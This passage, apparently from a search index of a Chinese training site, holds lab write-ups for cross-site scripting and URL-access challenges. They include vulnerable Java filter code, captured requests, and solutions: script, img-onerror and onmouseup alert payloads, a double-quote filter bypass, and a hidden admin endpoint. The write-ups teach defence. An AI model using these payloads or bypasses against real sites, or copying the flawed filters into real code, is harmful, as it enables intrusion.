\u8fd9\u7c7b\u653b\u51fb\u7684\u9632\u5fa1\u662f\u975e\u5e38\u590d\u6742\u7684\uff0c\u539f\u56e0\u662f\u524d\u7aef\u9875\u9762\u7684\u8f93\u51fa\u70b9\u592a\u591a\uff0c\u5982html\u3001javascript\u3001css\u7b49\u7b49\uff0c\u6709\u4e9b\u8f93\u5165\u70b9\u5b8c\u5168\u4e0d\u9700\u8981\u4efb\u4f55\u7279\u6b8a\u5b57\u7b26\uff0c\u56e0\u6b64\u5728\u505a\u597d\u57fa\u7840\u9632\u5fa1(\u8f93\u5165\u4e0e\u9a8c\u8bc1\u548c\u7f16\u7801\u8f93\u51fa)\u57fa\u7840\u4e0a\uff0c\u4e5f\u8981\u9488\u5bf9\u7279\u5b9a\u573a\u666f\u8fdb\u884c\u7279\u6b8a\u9a8c\u8bc1","title":"\u603b\u7ed3"},{"location":"vul/Cross-Site-Scripting-Six.html","text":"Cross Site Scripting Six(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 6) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u5229\u7528xss\u6ce8\u5165\u70b9\uff0c\u5b9e\u73b0\u4e00\u4e2a\u5f39\u6846 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/d330dea1acf21886b685184ee222ea8e0a60589c3940afd6ebf433469e997caf HTTP/1.1 searchTerm=test&csrfToken=50163458658349300026575546979087684293 \u529f\u80fd\u5b9e\u73b0\u4ee3\u7801 String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); searchTerm = XssFilter.anotherBadUrlValidate(searchTerm); userPost = \"<a href=\\\"\" + searchTerm + \"\\\">Your HTTP Link!</a>\"; log.debug(\"After Sanitising - \" + searchTerm); boolean xssDetected = FindXSS.search(userPost); if(xssDetected) { htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"result.wellDone\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.youDidIt\") + \"<br />\" + bundle.getString(\"result.resultKey\") + \" <a>\" + Hash.generateUserSolution( Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash), (String)ses.getAttribute(\"userName\") ) + \"</a>\"; } public static String XssFilter.anotherBadUrlValidate (String input) { String howToMakeAUrlUrl = new String(\"https://www.google.com/search?q=What+does+a+HTTP+link+look+like\"); input = input.toLowerCase(); if (input.startsWith(\"http\")) { try { URL theUrl = new URL(input.replaceAll(\"#\", \"&#x23;\").replaceFirst(\"<\", \"&#x3c;\").replaceFirst(\">\", \"&#x3e;\").replaceFirst(\"\\\"\", \"&quot;\")); //\u53ea\u66ff\u6362\u4e86\u7b2c\u4e00\u4e2a \u53cc\u5f15\u53f7 input = theUrl.toString(); } catch (MalformedURLException e) { log.debug(\"Could not Cast URL from input: \" + e.toString()); input = howToMakeAUrlUrl; } } else { log.debug(\"Was not a HTTP URL\"); input = howToMakeAUrlUrl; } return input; } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u8f93\u5165\u4e24\u4e2a\u53cc\u5f15\u53f7 \u5373\u53ef\u7ed5\u8fc7\u8fc7\u6ee4 \u603b\u7ed3 \u00b6 \u4e0d\u5b89\u5168\u7684\u8fc7\u6ee4\u975e\u5e38\u7684\u5371\u9669","title":"Cross Site Scripting Six(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 6)"},{"location":"vul/Cross-Site-Scripting-Six.html#cross-site-scripting-six-6","text":"","title":"Cross Site Scripting Six(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 6)"},{"location":"vul/Cross-Site-Scripting-Six.html#_1","text":"\u5229\u7528xss\u6ce8\u5165\u70b9\uff0c\u5b9e\u73b0\u4e00\u4e2a\u5f39\u6846","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Cross-Site-Scripting-Six.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/d330dea1acf21886b685184ee222ea8e0a60589c3940afd6ebf433469e997caf HTTP/1.1 searchTerm=test&csrfToken=50163458658349300026575546979087684293 \u529f\u80fd\u5b9e\u73b0\u4ee3\u7801 String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); searchTerm = XssFilter.anotherBadUrlValidate(searchTerm); userPost = \"<a href=\\\"\" + searchTerm + \"\\\">Your HTTP Link!</a>\"; log.debug(\"After Sanitising - \" + searchTerm); boolean xssDetected = FindXSS.search(userPost); if(xssDetected) { htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"result.wellDone\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.youDidIt\") + \"<br />\" + bundle.getString(\"result.resultKey\") + \" <a>\" + Hash.generateUserSolution( Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash), (String)ses.getAttribute(\"userName\") ) + \"</a>\"; } public static String XssFilter.anotherBadUrlValidate (String input) { String howToMakeAUrlUrl = new String(\"https://www.google.com/search?q=What+does+a+HTTP+link+look+like\"); input = input.toLowerCase(); if (input.startsWith(\"http\")) { try { URL theUrl = new URL(input.replaceAll(\"#\", \"&#x23;\").replaceFirst(\"<\", \"&#x3c;\").replaceFirst(\">\", \"&#x3e;\").replaceFirst(\"\\\"\", \"&quot;\")); //\u53ea\u66ff\u6362\u4e86\u7b2c\u4e00\u4e2a \u53cc\u5f15\u53f7 input = theUrl.toString(); } catch (MalformedURLException e) { log.debug(\"Could not Cast URL from input: \" + e.toString()); input = howToMakeAUrlUrl; } } else { log.debug(\"Was not a HTTP URL\"); input = howToMakeAUrlUrl; } return input; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Cross-Site-Scripting-Six.html#_3","text":"\u8f93\u5165\u4e24\u4e2a\u53cc\u5f15\u53f7 \u5373\u53ef\u7ed5\u8fc7\u8fc7\u6ee4","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Cross-Site-Scripting-Six.html#_4","text":"\u4e0d\u5b89\u5168\u7684\u8fc7\u6ee4\u975e\u5e38\u7684\u5371\u9669","title":"\u603b\u7ed3"},{"location":"vul/Cross-Site-Scripting-Two.html","text":"Cross Site Scripting Two(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 2) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u4e00\u4e2aXSS\u653b\u51fb\u70b9\uff0c\u9700\u8981\u63d0\u4ea4\u4e00\u4e2a\u7ed5\u8fc7\u68c0\u67e5\u7684\u653b\u51fb\u8bed\u53e5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/t27357536888e807ff0f0eff751d6034bafe48954575c3a6563cb47a85b1e888 HTTP/1.1 searchTerm=%3Cimg+src%3D%23+onerror%3Dalert(1)+%3E&csrfToken=22792033228396859635296159069930202705 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 src/main/java/servlets/module/challenge/XssChallengeTwo.java String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); searchTerm = XssFilter.levelTwo(searchTerm); log.debug(\"After Filtering - \" + searchTerm); String htmlOutput = new String(); if(FindXSS.search(searchTerm)) //\u8c03\u7528\u8fc7\u6ee4\u51fd\u6570\u8fdb\u884c\u8fc7\u6ee4 { htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"result.wellDone\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.youDidIt\") + \"<br />\" + bundle.getString(\"result.resultKey\") + \" <a>\" + Hash.generateUserSolution( Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash ), (String)ses.getAttribute(\"userName\") ) + \"</a>\"; log.debug(levelName + \" completed\"); } public static boolean FindXSS.search (String xssString) { boolean xssDetected = false; log.debug(\"String to Search: \" + xssString); //Need to tidy submitted string, similar to how a browser would when it interprets it Tidy tidy = new Tidy(); tidy.setXHTML(true); //\u8fdb\u884c\u8fc7\u6ee4 tidy.setQuiet(true); tidy.setShowWarnings(false); InputStream inputStream = new ByteArrayInputStream(xssString.getBytes()); ByteArrayOutputStream outputStream = new ByteArrayOutputStream(); tidy.parseDOM(inputStream, outputStream); String tidyHtml = outputStream.toString().toLowerCase(); try { outputStream.close(); inputStream.close(); } catch(Exception e) { log.error(\"Could not Cloud Tidy Input/Output Streams: \" + e.toString()); } \u5982\u679c\u7ecf\u8fc7\u8fc7\u6ee4\u7684\u6570\u636e\u91cc\u9762\u4ecd\u7136\u5b58\u5728\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\u7684alert\u5c31\u8ba4\u4e3a\u6210\u529f \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5b98\u65b9\u7ed9\u7684\u7b54\u6848 <input type=\"button\" onmouseup=\"alert('XSS')\"/> \u603b\u7ed3 \u00b6 \u8bd5\u56fe\u9488\u5bf9XSS\u653b\u51fb\u7684\u8fc7\u6ee4\u65f6\u975e\u5e38\u96be\u7684\uff0c\u975e\u5bcc\u6587\u672c\u7684\u60c5\u51b5\uff0c\u5c3d\u53ef\u80fd\u8fdb\u884c\u7f16\u7801\u8f93\u51fa \uff0c\u6216\u4f7f\u7528\u516c\u8ba4\u7684\u5b89\u5168\u5e93\u8fdb\u884c\u64cd\u4f5c","title":"Cross Site Scripting Two(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 2)"},{"location":"vul/Cross-Site-Scripting-Two.html#cross-site-scripting-two-2","text":"","title":"Cross Site Scripting Two(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 2)"},{"location":"vul/Cross-Site-Scripting-Two.html#_1","text":"\u4e00\u4e2aXSS\u653b\u51fb\u70b9\uff0c\u9700\u8981\u63d0\u4ea4\u4e00\u4e2a\u7ed5\u8fc7\u68c0\u67e5\u7684\u653b\u51fb\u8bed\u53e5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Cross-Site-Scripting-Two.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/t27357536888e807ff0f0eff751d6034bafe48954575c3a6563cb47a85b1e888 HTTP/1.1 searchTerm=%3Cimg+src%3D%23+onerror%3Dalert(1)+%3E&csrfToken=22792033228396859635296159069930202705 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 src/main/java/servlets/module/challenge/XssChallengeTwo.java String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); searchTerm = XssFilter.levelTwo(searchTerm); log.debug(\"After Filtering - \" + searchTerm); String htmlOutput = new String(); if(FindXSS.search(searchTerm)) //\u8c03\u7528\u8fc7\u6ee4\u51fd\u6570\u8fdb\u884c\u8fc7\u6ee4 { htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"result.wellDone\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.youDidIt\") + \"<br />\" + bundle.getString(\"result.resultKey\") + \" <a>\" + Hash.generateUserSolution( Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash ), (String)ses.getAttribute(\"userName\") ) + \"</a>\"; log.debug(levelName + \" completed\"); } public static boolean FindXSS.search (String xssString) { boolean xssDetected = false; log.debug(\"String to Search: \" + xssString); //Need to tidy submitted string, similar to how a browser would when it interprets it Tidy tidy = new Tidy(); tidy.setXHTML(true); //\u8fdb\u884c\u8fc7\u6ee4 tidy.setQuiet(true); tidy.setShowWarnings(false); InputStream inputStream = new ByteArrayInputStream(xssString.getBytes()); ByteArrayOutputStream outputStream = new ByteArrayOutputStream(); tidy.parseDOM(inputStream, outputStream); String tidyHtml = outputStream.toString().toLowerCase(); try { outputStream.close(); inputStream.close(); } catch(Exception e) { log.error(\"Could not Cloud Tidy Input/Output Streams: \" + e.toString()); } \u5982\u679c\u7ecf\u8fc7\u8fc7\u6ee4\u7684\u6570\u636e\u91cc\u9762\u4ecd\u7136\u5b58\u5728\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\u7684alert\u5c31\u8ba4\u4e3a\u6210\u529f","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Cross-Site-Scripting-Two.html#_3","text":"\u5b98\u65b9\u7ed9\u7684\u7b54\u6848 <input type=\"button\" onmouseup=\"alert('XSS')\"/>","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Cross-Site-Scripting-Two.html#_4","text":"\u8bd5\u56fe\u9488\u5bf9XSS\u653b\u51fb\u7684\u8fc7\u6ee4\u65f6\u975e\u5e38\u96be\u7684\uff0c\u975e\u5bcc\u6587\u672c\u7684\u60c5\u51b5\uff0c\u5c3d\u53ef\u80fd\u8fdb\u884c\u7f16\u7801\u8f93\u51fa \uff0c\u6216\u4f7f\u7528\u516c\u8ba4\u7684\u5b89\u5168\u5e93\u8fdb\u884c\u64cd\u4f5c","title":"\u603b\u7ed3"},{"location":"vul/Cross-Site-Scripting.html","text":"Cross Site Scripting(\u8de8\u7ad9\u811a\u672c\u653b\u51fb) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u5728\u641c\u7d22\u6846\u4e2d\u8f93\u5165\u4e00\u4e2a\u53ef\u4ee5\u5728\u524d\u7aef\u9875\u9762\u5f39\u51faalert\u63d0\u793a\u4fe1\u606f\u7684\u5185\u5bb9 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u9875\u9762\u70b9\u51fb \u83b7\u5f97\u8fd9\u4e2a\u7528\u6237 \u6309\u94ae POST /lessons/zf8ed52591579339e590e0726c7b24009f3ac54cdff1b81a65db1688d86efb3a searchTerm=%3CSCRIPT%3Ealert('XSS')%3C%2FSCRIPT%3E&csrfToken=-127827516577406622538923948450307535312 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 /src/main/java/servlets/module/lesson/XssLesson.java String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); String htmlOutput = new String(); if(FindXSS.search(searchTerm)) { log.debug(\"XSS Lesson Completed!\"); \u83b7\u5f97searchTerm\u53c2\u6570\u503c,\u5728/src/main/java/utils/FindXSS.java \u89e3\u6790\u4f20\u5165\u5185\u5bb9,\u8fdb\u800c\u5224\u65ad\u662f\u5426\u5b58\u5728alert\uff0c\u76f8\u5173\u4ee3\u7801 Elements scriptTags = htmlBody.getElementsByTag(\"script\"); for(Element scriptTag: scriptTags) { String tagContents = scriptTag.html(); //log.debug(\"tagContents: \" + tagContents); if(tagContents.contains(\"alert\")) { log.debug(\"Script Tags detected\"); xssDetected = true; break; } } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5728\u9875\u9762\u8f93\u5165\u6846\u8f93\u5165\u5982\u4e0bjavascript\u4ee3\u7801\u5373\u53ef <SCRIPT>alert('XSS')</SCRIPT> \u603b\u7ed3 \u00b6 \u5982\u679c\u7cfb\u7edf\u5b58\u5728 \u8fd9\u6837\u529f\u80fd: \u63a5\u6536\u5ba2\u6237\u7aef\u63d0\u4ea4\u5185\u5bb9 \u5b58\u50a8\u5ba2\u6237\u7aef\u5185\u5bb9(\u53ef\u4ee5\u6ca1\u6709\u8be5\u529f\u80fd) \u8fd4\u56de\u5ba2\u6237\u7aef\u5185\u5bb9\u5230\u524d\u7aef\u6e32\u67d3\u5c55\u793a \u90a3\u4e48\u9700\u8981\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u5185\u5bb9\u8fdb\u884chtml\u6216javascript\u8fc7\u6ee4\uff0c\u7981\u6b62\u51fa\u73b0\u4e00\u4e9b\u53ef\u4ee5\u6d4f\u89c8\u5668\u6267\u884c\u7684\u811a\u672c,\u5982javascript\u6216html\u4ee3\u7801 \u5982\u679c\u60a8\u7684\u7cfb\u7edf\u6ca1\u6709\u5bcc\u6587\u672c(\u5305\u542b\u6807\u7b7e\u7684\u7528\u6237\u63d0\u4ea4\uff0c\u5982<a \u7b49),\u53ef\u4ee5\u76f4\u63a5\u91c7\u7528\u7f16\u7801\u8f93\u51fa\u7684\u65b9\u6cd5\uff0c\u5c06<, > \u7b49\u8fdb\u884c\u7f16\u7801\u8f93\u51fa \u5982\u679c\u60a8\u7684\u7cfb\u7edf\u9700\u8981\u5bcc\u6587\u672c\uff0c\u5219\u53ea\u80fd\u5728\u63a5\u6536\u5230\u7528\u6237\u63d0\u4ea4\u5185\u5bb9\u65f6\u8fdb\u884c\u767d\u540d\u5355\u6807\u7b7e\u6821\u9a8c \u8fd9\u7c7b\u653b\u51fb\u7684\u9632\u5fa1\u662f\u975e\u5e38\u590d\u6742\u7684\uff0c\u539f\u56e0\u662f\u524d\u7aef\u9875\u9762\u7684\u8f93\u51fa\u70b9\u592a\u591a\uff0c\u5982html\u3001javascript\u3001css\u7b49\u7b49\uff0c\u6709\u4e9b\u8f93\u5165\u70b9\u5b8c\u5168\u4e0d\u9700\u8981\u4efb\u4f55\u7279\u6b8a\u5b57\u7b26\uff0c\u56e0\u6b64\u5728\u505a\u597d\u57fa\u7840\u9632\u5fa1(\u8f93\u5165\u4e0e\u9a8c\u8bc1\u548c\u7f16\u7801\u8f93\u51fa)\u57fa\u7840\u4e0a\uff0c\u4e5f\u8981\u9488\u5bf9\u7279\u5b9a\u573a\u666f\u8fdb\u884c\u7279\u6b8a\u9a8c\u8bc1","title":"Cross Site Scripting(\u8de8\u7ad9\u811a\u672c\u653b\u51fb)"},{"location":"vul/Cross-Site-Scripting.html#cross-site-scripting","text":"","title":"Cross Site Scripting(\u8de8\u7ad9\u811a\u672c\u653b\u51fb)"},{"location":"vul/Cross-Site-Scripting.html#_1","text":"\u9700\u8981\u5728\u641c\u7d22\u6846\u4e2d\u8f93\u5165\u4e00\u4e2a\u53ef\u4ee5\u5728\u524d\u7aef\u9875\u9762\u5f39\u51faalert\u63d0\u793a\u4fe1\u606f\u7684\u5185\u5bb9","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Cross-Site-Scripting.html#_2","text":"\u9875\u9762\u70b9\u51fb \u83b7\u5f97\u8fd9\u4e2a\u7528\u6237 \u6309\u94ae POST /lessons/zf8ed52591579339e590e0726c7b24009f3ac54cdff1b81a65db1688d86efb3a searchTerm=%3CSCRIPT%3Ealert('XSS')%3C%2FSCRIPT%3E&csrfToken=-127827516577406622538923948450307535312 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 /src/main/java/servlets/module/lesson/XssLesson.java String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); String htmlOutput = new String(); if(FindXSS.search(searchTerm)) { log.debug(\"XSS Lesson Completed!\"); \u83b7\u5f97searchTerm\u53c2\u6570\u503c,\u5728/src/main/java/utils/FindXSS.java \u89e3\u6790\u4f20\u5165\u5185\u5bb9,\u8fdb\u800c\u5224\u65ad\u662f\u5426\u5b58\u5728alert\uff0c\u76f8\u5173\u4ee3\u7801 Elements scriptTags = htmlBody.getElementsByTag(\"script\"); for(Element scriptTag: scriptTags) { String tagContents = scriptTag.html(); //log.debug(\"tagContents: \" + tagContents); if(tagContents.contains(\"alert\")) { log.debug(\"Script Tags detected\"); xssDetected = true; break; } }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Cross-Site-Scripting.html#_3","text":"\u5728\u9875\u9762\u8f93\u5165\u6846\u8f93\u5165\u5982\u4e0bjavascript\u4ee3\u7801\u5373\u53ef <SCRIPT>alert('XSS')</SCRIPT>","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Cross-Site-Scripting.html#_4","text":"\u5982\u679c\u7cfb\u7edf\u5b58\u5728 \u8fd9\u6837\u529f\u80fd: \u63a5\u6536\u5ba2\u6237\u7aef\u63d0\u4ea4\u5185\u5bb9 \u5b58\u50a8\u5ba2\u6237\u7aef\u5185\u5bb9(\u53ef\u4ee5\u6ca1\u6709\u8be5\u529f\u80fd) \u8fd4\u56de\u5ba2\u6237\u7aef\u5185\u5bb9\u5230\u524d\u7aef\u6e32\u67d3\u5c55\u793a \u90a3\u4e48\u9700\u8981\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u5185\u5bb9\u8fdb\u884chtml\u6216javascript\u8fc7\u6ee4\uff0c\u7981\u6b62\u51fa\u73b0\u4e00\u4e9b\u53ef\u4ee5\u6d4f\u89c8\u5668\u6267\u884c\u7684\u811a\u672c,\u5982javascript\u6216html\u4ee3\u7801 \u5982\u679c\u60a8\u7684\u7cfb\u7edf\u6ca1\u6709\u5bcc\u6587\u672c(\u5305\u542b\u6807\u7b7e\u7684\u7528\u6237\u63d0\u4ea4\uff0c\u5982<a \u7b49),\u53ef\u4ee5\u76f4\u63a5\u91c7\u7528\u7f16\u7801\u8f93\u51fa\u7684\u65b9\u6cd5\uff0c\u5c06<, > \u7b49\u8fdb\u884c\u7f16\u7801\u8f93\u51fa \u5982\u679c\u60a8\u7684\u7cfb\u7edf\u9700\u8981\u5bcc\u6587\u672c\uff0c\u5219\u53ea\u80fd\u5728\u63a5\u6536\u5230\u7528\u6237\u63d0\u4ea4\u5185\u5bb9\u65f6\u8fdb\u884c\u767d\u540d\u5355\u6807\u7b7e\u6821\u9a8c \u8fd9\u7c7b\u653b\u51fb\u7684\u9632\u5fa1\u662f\u975e\u5e38\u590d\u6742\u7684\uff0c\u539f\u56e0\u662f\u524d\u7aef\u9875\u9762\u7684\u8f93\u51fa\u70b9\u592a\u591a\uff0c\u5982html\u3001javascript\u3001css\u7b49\u7b49\uff0c\u6709\u4e9b\u8f93\u5165\u70b9\u5b8c\u5168\u4e0d\u9700\u8981\u4efb\u4f55\u7279\u6b8a\u5b57\u7b26\uff0c\u56e0\u6b64\u5728\u505a\u597d\u57fa\u7840\u9632\u5fa1(\u8f93\u5165\u4e0e\u9a8c\u8bc1\u548c\u7f16\u7801\u8f93\u51fa)\u57fa\u7840\u4e0a\uff0c\u4e5f\u8981\u9488\u5bf9\u7279\u5b9a\u573a\u666f\u8fdb\u884c\u7279\u6b8a\u9a8c\u8bc1","title":"\u603b\u7ed3"},{"location":"vul/Failure-To-Restrict-URL-Access-Challenge-1.html","text":"Failure To Restrict URL Access Challenge 1(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee 1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u4ee5\u7ba1\u7406\u5458\u7684\u6743\u9650\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb\u9875\u9762\u6309\u94ae\u83b7\u5f97\u8bf7\u6c42\u5305 POST /challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c99 HTTP/1.1 userData=4816283 \u5bf9\u5e94\u540e\u7aef\u6587\u4ef6 /src/main/java/servlets/module/challenge/UrlAccess1.java String userData = request.getParameter(\"userData\"); boolean tamperedRequest = !userData.equalsIgnoreCase(\"4816283\"); if(!tamperedRequest) log.debug(\"No request tampering detected\"); else log.debug(\"User Submitted - \" + userData); if(!tamperedRequest) htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.status\") + \"</h2>\" + \"<p>\" + bundle.getString(\"response.status.message\") + \"</p>\"; else htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.statusFail\") + \"</h2>\" + \"<p>\" + bundle.getString(\"response.statusFail.message\") + \"</p>\" + \"<!-- \" + Encode.forHtml(userData) + \" -->\"; \u4ee3\u7801\u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981\u8f93\u5165userData=4816283\u5c31\u53ef\u4ee5\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u901a\u5173\u5bc6\u94a5 \u53c8\u7814\u7a76\u524d\u7aef\u4ee3\u7801\u53d1\u73b0\u4e0b\u9762\u7684javascript\u4ee3\u7801 $(\"#leAdminForm\").submit(function(){ $(\"#submitButton\").hide(\"fast\"); $(\"#loadingSign\").show(\"slow\"); $(\"#resultsDiv\").hide(\"slow\", function(){ var ajaxCall = $.ajax({ type: \"POST\", url: \"4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992\", data: { userData: \"4816283\", }, async: false } \u8bf7\u6c42\u7684\u8def\u5f84\u662f 4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992 \u6bd4\u539f\u6765\u8bf7\u6c42\u7684\u8def\u5f84 4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c99 \u591a\u4e86\u4e00\u4e2a2 \u67e5\u770b /challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992 \u5bf9\u5e94\u7684\u540e\u7aef\u4ee3\u7801 src/main/java/servlets/module/challenge/UrlAccess1Admin.java String userData = request.getParameter(\"userData\"); boolean tamperedRequest = !userData.equalsIgnoreCase(\"4816283\"); //\u53ea\u9700\u8981userData=4816283 if(!tamperedRequest) log.debug(\"No request tampering detected\"); else log.debug(\"User Submitted - \" + userData); if(!tamperedRequest) { String userKey = Hash.generateUserSolution(levelResult, (String)ses.getAttribute(\"userName\")); //\u751f\u6210\u901a\u5173\u5bc6\u94a5\u7684\u4ee3\u7801 htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.status\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.keyMessage.1\") + \"<br />\" + \"<a>\" + userKey + \"</a><br /> \" + bundle.getString(\"result.keyMessage.2\") + \"</p>\"; \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5c06post\u8bf7\u6c42\u7684\u5730\u5740 /challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c99 \u4fee\u6539\u4e3a /challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992 \u5373\u53ef \u603b\u7ed3 \u00b6 \u4efb\u4f55URL\u90fd\u9700\u8981\u6dfb\u52a0\u6b63\u786e\u7684\u8bbf\u95ee\u9650\u5236 \u6c49\u5316\u8bf4\u660e \u00b6 src/main/resources/i18n/challenges/urlAccess/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c99_zh.properties","title":"Failure To Restrict URL Access Challenge 1(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee 1)"},{"location":"vul/Failure-To-Restrict-URL-Access-Challenge-1.html#failure-to-restrict-url-access-challenge-1url-1","text":"","title":"Failure To Restrict URL Access Challenge 1(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee 1)"},{"location":"vul/Failure-To-Restrict-URL-Access-Challenge-1.html#_1","text":"\u9700\u8981\u4ee5\u7ba1\u7406\u5458\u7684\u6743\u9650\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Failure-To-Restrict-URL-Access-Challenge-1.html#_2","text":"\u70b9\u51fb\u9875\u9762\u6309\u94ae\u83b7\u5f97\u8bf7\u6c42\u5305 POST /challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c99 HTTP/1.1 userData=4816283 \u5bf9\u5e94\u540e\u7aef\u6587\u4ef6 /src/main/java/servlets/module/challenge/UrlAccess1.java String userData = request.getParameter(\"userData\"); boolean tamperedRequest = !userData.equalsIgnoreCase(\"4816283\"); if(!tamperedRequest) log.debug(\"No request tampering detected\"); else log.debug(\"User Submitted - \" + userData); if(!tamperedRequest) htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.status\") + \"</h2>\" + \"<p>\" + bundle.getString(\"response.status.message\") + \"</p>\"; else htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.statusFail\") + \"</h2>\" + \"<p>\" + bundle.getString(\"response.statusFail.message\") + \"</p>\" + \"<!-- \" + Encode.forHtml(userData) + \" -->\"; \u4ee3\u7801\u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981\u8f93\u5165userData=4816283\u5c31\u53ef\u4ee5\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u901a\u5173\u5bc6\u94a5 \u53c8\u7814\u7a76\u524d\u7aef\u4ee3\u7801\u53d1\u73b0\u4e0b\u9762\u7684javascript\u4ee3\u7801 $(\"#leAdminForm\").submit(function(){ $(\"#submitButton\").hide(\"fast\"); $(\"#loadingSign\").show(\"slow\"); $(\"#resultsDiv\").hide(\"slow\", function(){ var ajaxCall = $.ajax({ type: \"POST\", url: \"4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992\", data: { userData: \"4816283\", }, async: false } \u8bf7\u6c42\u7684\u8def\u5f84\u662f 4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992 \u6bd4\u539f\u6765\u8bf7\u6c42\u7684\u8def\u5f84 4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c99 \u591a\u4e86\u4e00\u4e2a2 \u67e5\u770b /challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992 \u5bf9\u5e94\u7684\u540e\u7aef\u4ee3\u7801 src/main/java/servlets/module/challenge/UrlAccess1Admin.java String userData = request.getParameter(\"userData\"); boolean tamperedRequest = !userData.equalsIgnoreCase(\"4816283\"); //\u53ea\u9700\u8981userData=4816283 if(!tamperedRequest) log.debug(\"No request tampering detected\"); else log.debug(\"User Submitted - \" + userData); if(!tamperedRequest) { String userKey = Hash.generateUserSolution(levelResult, (String)ses.getAttribute(\"userName\")); //\u751f\u6210\u901a\u5173\u5bc6\u94a5\u7684\u4ee3\u7801 htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.status\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.keyMessage.1\") + \"<br />\" + \"<a>\" + userKey + \"</a><br /> \" + bundle.getString(\"result.keyMessage.2\") + 